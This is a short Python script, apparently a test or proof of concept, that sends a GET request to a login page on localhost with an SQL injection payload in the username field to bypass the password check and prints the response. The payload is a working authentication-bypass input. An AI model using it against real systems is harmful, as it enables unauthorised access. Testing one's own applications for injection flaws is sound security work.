import requests

# URL to be tested
url = "http://127.0.0.1:5000/login"
params = {
    'username': "admin' OR '1'='1'--",
    'password': 'any_password'  # The password can be anything since the SQL injection should bypass it
}

# Send the GET request
response = requests.get(url, params=params)

# Print the response
print(f"Status Code: {response.status_code}")
print(f"Response Text:\n{response.text}")
